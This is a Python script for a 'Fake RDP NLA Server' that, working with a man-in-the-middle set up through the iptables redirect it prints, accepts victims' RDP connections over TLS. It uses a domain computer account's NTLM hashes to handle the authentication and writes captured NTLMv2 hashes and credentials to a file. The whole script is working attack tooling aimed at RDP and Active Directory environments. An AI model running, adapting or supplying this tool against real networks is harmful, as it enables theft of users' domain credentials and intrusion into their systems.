from TSDecode import *
from NTLMStruct import *
from SPNEGOHandler import *
from Forwarder import *
import socket
import time
import sys
import ssl
import hashlib
import argparse
from OpenSSL import crypto

def doubleEncoding(NTLMMess):
      myrequest = TSRequest()
      myrequest['NegoData'] = NTLMMess
      myrequest['Version'] = 6
      my_request = TSRequest()
      my_request['NegoData'] = myrequest.getData()
      my_request['Version'] = 6
      return my_request


def initSSLContext():
    context = ssl.create_default_context()
    context.load_cert_chain('./server.crt','./server.key')
    context.check_hostname=False
    context.verify_mode=ssl.CERT_NONE

    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sock.bind(('0.0.0.0',3389))
    sock.listen(5)
    return sock, context



parser = argparse.ArgumentParser(add_help = True, description = "Fake RDP NLA Server")
requiredArgs = parser.add_argument_group('Required Arguments')
requiredArgs.add_argument('-computer', action = "store",required=True,  help= "computer account COMPUTER$")
requiredArgs.add_argument('-hashes', action ="store",required=True, metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
requiredArgs.add_argument('-domain', action ="store",required=True, help="short domain name ex: microsoft")
requiredArgs.add_argument('-dnsdomain', action = "store", required=True, help= "dns domain name ex: microsoft.com")
requiredArgs.add_argument('-domainIP', action = "store", required=True, help='ip address of the DC for your domain')
parser.add_argument('-CredSSP', action = "store",type=int, default=6, help='Version of CredSSP Default : 6')
parser.add_argument('-outfile', action = "store",  default=None, help='File to store NTLMv2 Hashes and credentials')

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
options = parser.parse_args()
options.serverName = options.computer.split('$')[0]



sock, context= initSSLContext()
print "You need to start MitM first"
print '!!! Be sure to "sysctl -w net.ipv4.conf.all.route_localnet=1" !!!'
print '!!! Redirect Traffic "iptables -t nat -A PREROUTING -p tcp --dport 3389 -j DNAT --to-destination 127.0.0.1:3389" !!!'
while(True):
    (cli,ip)=sock.accept()
    cli.recv(4092)
    cli.send(b'\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x1f\x08\x00\x08\x00\x00\x00')
    ssock=context.wrap_socket(cli, server_side=True)
    while(True):
         try:
            SPNEGOHandler(ssock,options)
         except:
            break
    print "Waiting for a new TLS session"

